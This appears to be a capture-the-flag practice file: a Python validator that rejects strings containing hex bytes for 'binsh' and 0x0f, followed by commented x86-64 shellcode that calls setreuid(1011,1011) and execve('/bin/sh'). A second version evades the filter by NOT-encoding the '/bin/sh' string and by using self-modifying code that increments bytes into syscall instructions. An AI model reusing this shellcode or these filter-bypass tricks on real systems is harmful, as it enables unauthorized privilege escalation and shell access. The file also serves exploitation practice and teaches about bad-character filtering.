def check_string_patterns():
    # 1. Define the forbidden patterns
    forbidden_patterns = ["0x62", "0x69", "0x6e", "0x73", "0x68", "0xf"]

    # 2. Get input from the user
    user_input = input("Please enter a string to validate: ")

    # 3. Check for patterns using 'any' and a generator expression
    # This checks if any pattern in our list is a substring of user_input
    found_forbidden = any(pattern in user_input for pattern in forbidden_patterns)

    # 4. Return the appropriate message
    if found_forbidden:
        print("Error: The string contains forbidden hex patterns.")
    else:
        print("Congrats! Your string is valid.")

# Run the function
if __name__ == "__main__":
    check_string_patterns()

# section .text
# global _start

# _start:
#     ; --- setreuid(1011, 1011) ---
#     ; 1011 in hex is 0x3f3
#     xor rax, rax
#     mov ax, 113         ; syscall: setreuid
#     mov edi, 1011       ; ruid
#     mov esi, 1011       ; euid
#     syscall

#     ; --- execve('/bin/sh', NULL, NULL) ---
#     xor rax, rax
#     push rax            ; Null terminator for the string

#     ; Push '/bin/sh' in little-endian
#     ; 'hs/nib/' -> 0x68732f6e69622f2f (using // for 8-byte alignment)
#     mov rbx, 0x68732f6e69622f2f
#     push rbx

#     mov rdi, rsp        ; RDI points to the string on the stack
#     xor esi, esi        ; argv = NULL
#     xor edx, edx        ; envp = NULL
#     mov al, 59          ; syscall: execve
#     syscall


# .intel_syntax noprefix

# xor rax, rax
# mov ax, 113
# mov edi, 1011
# mov esi, 1011




# lea r10, [rip + fix_me]
# incb [r10]
# fix_me:
# .byte 0x0e, 0x05


# mov rbx, 0x978cd091969dd0d0
# not rbx
# push rbx
# mov rdi, rsp


# push 59
# pop rax
# mov rsi, 0
# mov rdx, 0


# lea r10, [rip + fix_me2]
# incb [r10]
# fix_me2:
# .byte 0x0e, 0x05
